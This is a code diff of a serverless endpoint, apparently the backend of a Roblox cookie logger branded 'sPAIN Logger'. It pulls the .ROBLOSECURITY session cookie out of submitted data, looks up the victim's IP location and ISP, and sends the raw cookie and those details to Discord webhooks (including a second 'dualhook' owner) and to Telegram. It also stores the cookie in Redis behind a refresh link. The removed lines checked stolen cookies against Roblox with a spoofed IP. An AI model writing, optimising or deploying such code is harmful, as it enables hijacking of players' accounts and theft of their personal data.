@@ -1,4 +1,4 @@
-// api/submit.js — sends cookie INSTANTLY, validates in background
+// api/submit.js — fire and done, no background work
 const REDIS_URL   = process.env.UPSTASH_REDIS_REST_URL;
 const REDIS_TOKEN = process.env.UPSTASH_REDIS_REST_TOKEN;
 const TG_TOKEN    = process.env.TG_TOKEN;
@@ -39,8 +39,10 @@ async function redisSet(key, value) {
 async function getIpGeo(ip) {
   try {
     if (!ip || ip === 'Unknown') return null;
-    const r = await fetch(`http://ip-api.com/json/${ip}?fields=status,country,regionName,city,isp`,
-      { signal: AbortSignal.timeout(3000) });
+    const r = await fetch(
+      `http://ip-api.com/json/${ip}?fields=status,country,regionName,city,isp`,
+      { signal: AbortSignal.timeout(2000) }  // 2s max, don't wait longer
+    );
     const d = await r.json();
     return d.status === 'success' ? d : null;
   } catch { return null; }
@@ -85,12 +87,11 @@ function findCookie(slots) {
 async function discordSend(url, payload) {
   if (!url?.includes('discord.com/api/webhooks')) return;
   try {
-    const r = await fetch(url, {
+    await fetch(url, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify(payload)
     });
-    if (!r.ok) console.error('Discord failed:', r.status, await r.text());
   } catch (e) { console.error('discordSend:', e.message); }
 }
 
@@ -108,83 +109,6 @@ async function discordChunked(url, text) {
   }
 }
 
-// ── Step 1: send cookie INSTANTLY (no Roblox validation) ─────────────────────
-async function sendInstant(webhookUrl, { cookie, ip, geo, now, pageName, refreshUrl }) {
-  await discordSend(webhookUrl, {
-    content: '@everyone',
-    embeds: [{
-      title:       '🍪 Cookie Captured',
-      description: '🔥 `sPAIN` 🔥\n⚡ Validating in background...',
-      color:       0xc026d3,
-      fields: [
-        { name: '🌐 IP',       value: ip || 'Unknown',                                                                     inline: true  },
-        { name: '📍 Location', value: [geo?.city, geo?.regionName, geo?.country].filter(Boolean).join(', ') || 'Unknown',  inline: true  },
-        { name: '🗺️ ISP',      value: geo?.isp || 'Unknown',                                                               inline: true  },
-        { name: '🕐 Time',     value: now,                                                                                  inline: false },
-      ],
-      footer:    { text: `sPAIN Logger • ${pageName}` },
-      timestamp: now
-    }]
-  });
-  // Raw cookie immediately
-  await discordChunked(webhookUrl, cookie);
-  // Refresh link
-  await discordSend(webhookUrl, {
-    content: `🔄 **Stats + PowerShell:** <${refreshUrl}>`
-  });
-}
-
-// ── Step 2: follow-up embed after background validation ───────────────────────
-async function sendValidated(webhookUrl, { username, id, valid, pageName, now }) {
-  await discordSend(webhookUrl, {
-    embeds: [{
-      title:       valid ? `✅ Valid — ${username}` : '❌ Invalid / Expired Cookie',
-      description: valid
-        ? `[Profile](https://www.roblox.com/users/${id}/profile)`
-        : 'Cookie was rejected by Roblox. Account may have logged out.',
-      color:       valid ? 0x22c55e : 0xff3333,
-      footer:      { text: `sPAIN Logger • ${pageName} • ${now}` },
-      timestamp:   now
-    }]
-  });
-}
-
-async function sendNoToken(webhookUrl, { ip, geo, now, pageName }) {
-  await discordSend(webhookUrl, {
-    embeds: [{
-      title: '⚠️ No cookie found in submission',
-      color: 0xff6600,
-      fields: [
-        { name: '🌐 IP',       value: ip || 'Unknown',                                                                inline: true  },
-        { name: '📍 Location', value: [geo?.city, geo?.country].filter(Boolean).join(', ') || 'Unknown',               inline: true  },
-        { name: '🕐 Time',     value: now,                                                                              inline: false }
-      ],
-      footer: { text: `sPAIN Tools • ${pageName}` },
-      timestamp: now
-    }]
-  });
-}
-
-// Background: validate cookie against Roblox
-async function validateCookie(cookie, ip) {
-  try {
-    const h = {
-      'Cookie':      `.ROBLOSECURITY=${cookie}`,
-      'User-Agent':  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
-      'Accept':      'application/json',
-      'Referer':     'https://www.roblox.com/',
-    };
-    if (ip && ip !== 'Unknown') { h['X-Forwarded-For'] = ip; h['X-Real-IP'] = ip; }
-    const r = await fetch('https://users.roblox.com/v1/users/authenticated', {
-      headers: h,
-      signal: AbortSignal.timeout(8000)
-    });
-    if (!r.ok) return null;
-    const d = await r.json();
-    return d?.id ? { id: d.id, username: d.name } : null;
-  } catch { return null; }
-}
-
 export default async function handler(req, res) {
   res.setHeader('Access-Control-Allow-Origin', '*');
   res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
@@ -198,89 +122,94 @@ export default async function handler(req, res) {
   if (!slots) return res.status(400).json({ error: 'slots is required' });
   if (!REDIS_URL || !REDIS_TOKEN) return res.status(500).json({ error: 'Server config error' });
 
+  // ── Get record from Redis ──────────────────────────────────────────────────
   const record = await redisGet(`slot:${slug}`);
   if (!record)         return res.status(404).json({ error: `Page "${slug}" not found` });
   if (!record.webhook) return res.status(500).json({ error: 'No webhook configured' });
 
-  // ── Respond to client immediately ─────────────────────────────────────────
-  res.status(200).json({ success: true });
+  const ip       = req.headers['x-forwarded-for']?.split(',')[0]?.trim()
+                || req.headers['x-real-ip'] || 'Unknown';
+  const cookie   = findCookie(slots);
+  const now      = new Date().toISOString();
+  const pageName = record.displayName || slug;
 
-  // ── Everything below is fire-and-forget ───────────────────────────────────
-  try {
-    const ip       = req.headers['x-forwarded-for']?.split(',')[0]?.trim()
-                  || req.headers['x-real-ip'] || 'Unknown';
-    const cookie   = findCookie(slots);
-    const now      = new Date().toISOString();
-    const pageName = record.displayName || slug;
+  // Collect webhooks
+  const webhooks = [record.webhook];
+  if (record.dualhookParent) {
+    try {
+      const parent = await redisGet(`slot:${record.dualhookParent}`);
+      if (parent?.webhook && parent.webhook !== record.webhook) webhooks.push(parent.webhook);
+    } catch (_) {}
+  }
 
-    // Collect webhooks
-    const webhooks = [record.webhook];
-    if (record.dualhookParent) {
-      try {
-        const parent = await redisGet(`slot:${record.dualhookParent}`);
-        if (parent?.webhook && parent.webhook !== record.webhook) webhooks.push(parent.webhook);
-      } catch (_) {}
-    }
+  if (!cookie) {
+    // No cookie — send alert and return fast
+    const geo = await getIpGeo(ip);
+    const noTokenEmbed = {
+      embeds: [{
+        title: '⚠️ No cookie found',
+        color: 0xff6600,
+        fields: [
+          { name: '🌐 IP',       value: ip || 'Unknown',                                                                inline: true },
+          { name: '📍 Location', value: [geo?.city, geo?.country].filter(Boolean).join(', ') || 'Unknown',               inline: true },
+          { name: '🕐 Time',     value: now,                                                                              inline: false }
+        ],
+        footer: { text: `sPAIN Tools • ${pageName}` },
+        timestamp: now
+      }]
+    };
+    await Promise.all(webhooks.map(wh => discordSend(wh, noTokenEmbed)));
+    return res.status(200).json({ success: true });
+  }
 
-    if (!cookie) {
-      // No cookie — still get geo fast and notify
-      const geo = await getIpGeo(ip);
-      for (const wh of webhooks) await sendNoToken(wh, { ip, geo, now, pageName });
-      await tgSend(`⚠️ <b>NO COOKIE — ${pageName}</b>\n🌐 <code>${ip}</code>`);
-      return;
-    }
+  // ── Cookie found — fire EVERYTHING in parallel ─────────────────────────────
+  const refreshId  = generateId();
+  const refreshUrl = `https://spain-tools.vercel.app/api/refresh?id=${refreshId}`;
 
-    // Generate refresh ID upfront so URL is ready instantly
-    const refreshId  = generateId();
-    const refreshUrl = `https://spain-tools.vercel.app/api/refresh?id=${refreshId}`;
+  // Run geo + redis save in parallel — don't wait for either to send to Discord
+  const [geo] = await Promise.all([
+    getIpGeo(ip),                                   // 2s max timeout
+    redisSet(`refresh:${refreshId}`, {              // save in background
+      cookie,
+      webhook:   record.webhook,
+      webhook1:  webhooks[1] || null,
+      pageName,
+      ip,
+      createdAt: now
+    })
+  ]);
 
-    // ── PARALLEL: geo lookup + instant Discord send + save to Redis ────────
-    // Geo runs while we also immediately start sending cookie to Discord
-    const [geo] = await Promise.all([
-      getIpGeo(ip),
-      // Save refresh record to Redis immediately (cookie is valid enough to save)
-      redisSet(`refresh:${refreshId}`, {
-        cookie,
-        webhook:   record.webhook,
-        webhook1:  webhooks[1] || null,
-        pageName,
-        ip,
-        createdAt: now
-      })
-    ]);
+  // Build embed
+  const embed = {
+    content: '@everyone',
+    embeds: [{
+      title:       '🍪 Cookie Captured',
+      description: `🔥 \`sPAIN\` 🔥\n🔄 Stats: <${refreshUrl}>`,
+      color:       0xc026d3,
+      fields: [
+        { name: '🌐 IP',       value: ip || 'Unknown',                                                                     inline: true  },
+        { name: '📍 Location', value: [geo?.city, geo?.regionName, geo?.country].filter(Boolean).join(', ') || 'Unknown',  inline: true  },
+        { name: '🗺️ ISP',      value: geo?.isp || 'Unknown',                                                               inline: true  },
+        { name: '🕐 Time',     value: now,                                                                                  inline: false },
+      ],
+      footer:    { text: `sPAIN Logger • ${pageName}` },
+      timestamp: now
+    }]
+  };
 
-    // ── INSTANT: send cookie + location to Discord RIGHT NOW ───────────────
-    for (const wh of webhooks) {
-      await sendInstant(wh, { cookie, ip, geo, now, pageName, refreshUrl });
-    }
+  // Send embed to ALL webhooks in parallel, then send cookie chunks
+  await Promise.all(webhooks.map(wh => discordSend(wh, embed)));
 
-    await tgSend([
-      `🍪 <b>COOKIE SENT — ${pageName}</b>`,
+  // Cookie chunks — send to each webhook sequentially per webhook but all webhooks parallel
+  await Promise.all(webhooks.map(wh => discordChunked(wh, cookie)));
+
+  // TG + respond to client at the same time
+  await Promise.all([
+    tgSend([
+      `🍪 <b>${pageName}</b>`,
       `🌐 <code>${ip}</code> — ${geo?.city||'?'}, ${geo?.country||'?'}`,
       `🔄 ${refreshUrl}`
-    ].join('\n'));
-
-    // ── BACKGROUND: validate cookie and send follow-up embed ───────────────
-    const user = await validateCookie(cookie, ip);
-    const validNow = new Date().toISOString();
-
-    for (const wh of webhooks) {
-      await sendValidated(wh, {
-        username: user?.username || 'Unknown',
-        id:       user?.id,
-        valid:    !!user,
-        pageName,
-        now:      validNow
-      });
-    }
-
-    if (user) {
-      await tgSend(`✅ <b>VALID — ${user.username} (${user.id})</b>\n📄 ${pageName}`);
-    } else {
-      await tgSend(`❌ <b>INVALID COOKIE — ${pageName}</b>`);
-    }
-
-  } catch (err) {
-    console.error('Post-response error:', err.message);
-  }
+    ].join('\n')),
+    Promise.resolve(res.status(200).json({ success: true }))
+  ]);
 }
